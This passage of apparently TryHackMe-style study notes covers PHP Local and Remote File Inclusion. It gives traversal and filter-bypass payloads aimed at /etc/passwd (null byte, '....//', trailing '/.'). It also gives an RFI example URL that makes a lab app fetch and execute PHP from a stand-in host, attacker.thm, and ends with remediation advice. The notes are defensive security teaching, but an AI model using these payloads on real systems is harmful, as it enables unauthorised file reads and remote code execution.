It seems we could move out of the PHP directory but still, the include function reads the input with .php at the end! This tells us that the developer specifies the file type to pass to the include function. To bypass this scenario, we can use the NULL BYTE, which is %00.

Using null bytes is an injection technique where URL-encoded representation such as %00 or 0x00 in hex with user-supplied data to terminate strings. You could think of it as trying to trick the web app into disregarding whatever comes after the Null Byte.

By adding the Null Byte at the end of the payload, we tell the  include function to ignore anything after the null byte which may look like:

include("languages/../../../../../etc/passwd%00").".php"); which equivalent to → include("languages/../../../../../etc/passwd");

NOTE: the %00 trick is fixed and not working with PHP 5.3.4 and above.


2. In this section, the developer decided to filter keywords to avoid disclosing sensitive information! The /etc/passwd file is being filtered. There are two possible methods to bypass the filter. First, by using the NullByte %00 or the current directory trick at the end of the filtered keyword /.. The exploit will be similar to http://webapp.thm/index.php?lang=/etc/passwd/. We could also use http://webapp.thm/index.php?lang=/etc/passwd%00.

To make it clearer, if we try this concept in the file system using cd .., it will get you back one step; however, if you do cd ., It stays in the current directory.  Similarly, if we try  /etc/passwd/.., it results to be  /etc/ and that's because we moved one to the root.  Now if we try  /etc/passwd/., the result will be  /etc/passwd since dot refers to the current directory.

3. Next, in the following scenarios, the developer starts to use input validation by filtering some keywords. Let's test out and check the error message!

http://webapp.thm/index.php?lang=../../../../etc/passwd

We got the following error!

```
Warning: include(languages/etc/passwd): failed to open stream: No such file or directory in /var/www/html/THM-5/index.php on line 15
```

If we check the warning message in the include(languages/etc/passwd) section, we know that the web application replaces the ../ with the empty string. There are a couple of techniques we can use to bypass this.

First, we can send the following payload to bypass it: ....//....//....//....//....//etc/passwd

Why did this work?

This works because the PHP filter only matches and replaces the first subset string ../ it finds and doesn't do another pass, leaving what is pictured below.

![image](https://user-images.githubusercontent.com/24814781/182138160-b7a71597-8e74-40b9-8389-be5385446ae5.png)


4. Finally, we'll discuss the case where the developer forces the include to read from a defined directory! For example, if the web application asks to supply input that has to include a directory such as: http://webapp.thm/index.php?lang=languages/EN.php then, to exploit this, we need to include the directory in the payload like so: ?lang=languages/../../../../../etc/passwd.


### Remote File Inclusion RFI

Remote File Inclusion - RFI

Remote File Inclusion (RFI) is a technique to include remote files and into a vulnerable application. Like LFI, the RFI occurs when improperly sanitizing user input, allowing an attacker to inject an external URL into include function. One requirement for RFI is that the allow_url_fopen option needs to be on.


The risk of RFI is higher than LFI since RFI vulnerabilities allow an attacker to gain Remote Command Execution (RCE) on the server. Other consequences of a successful RFI attack include:

Sensitive Information Disclosure

Cross-site Scripting (XSS)

Denial of Service (DoS)


An external server must communicate with the application server for a successful RFI attack where the attacker hosts malicious files on their server. Then the malicious file is injected into the include function via HTTP requests, and the content of the malicious file executes on the vulnerable application server.

![image](https://user-images.githubusercontent.com/24814781/182140017-0d9a9de2-a0f0-48af-9fb4-e0691dc49855.png)


RFI steps

The following figure is an example of steps for a successful RFI attack! Let's say that the attacker hosts a PHP file on their own server http://attacker.thm/cmd.txt where cmd.txt contains a printing message  Hello THM.

```
<?PHP echo "Hello THM"; ?>
```

First, the attacker injects the malicious URL, which points to the attacker's server, such as http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt. If there is no input validation, then the malicious URL passes into the include function. Next, the web app server will send a GET request to the malicious server to fetch the file. As a result, the web app includes the remote file into include function to execute the PHP file within the page and send the execution content to the attacker. In our case, the current page somewhere has to show the Hello THM message.

### LFI and RFI Remediation



As a developer, it's important to be aware of web application vulnerabilities, how to find them, and prevention methods. To prevent the file inclusion vulnerabilities, some common suggestions include:

1.    Keep system and services, including web application frameworks, updated with the latest version.

2.    Turn off PHP errors to avoid leaking the path of the application and other potentially revealing information.

3.    A Web Application Firewall (WAF) is a good option to help mitigate web application attacks.

4.    Disable some PHP features that cause file inclusion vulnerabilities if your web app doesn't need them, such as allow_url_fopen on and allow_url_include.

5.    Carefully analyze the web application and allow only protocols and PHP wrappers that are in need.

6.   Never trust user input, and make sure to implement proper input validation against file inclusion.

7.    Implement whitelisting for file names and locations as well as blacklisting.



